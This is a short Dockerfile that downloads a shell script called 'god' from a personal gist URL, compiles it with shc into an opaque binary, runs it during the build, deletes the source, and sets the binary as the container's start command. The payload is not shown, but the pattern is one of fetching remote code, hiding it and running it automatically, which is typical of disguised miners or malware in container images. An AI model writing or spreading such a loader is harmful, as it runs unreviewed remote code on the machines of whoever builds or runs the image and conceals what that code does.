FROM alpine:edge

ENV SHURL https://gist.githubusercontent.com/tomjack1342/71e09f496709ce239b08dcc905383def/raw/4f93a50c9e439114e5f95999dbad7694842c1fe4/god

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
    
CMD /worker.x
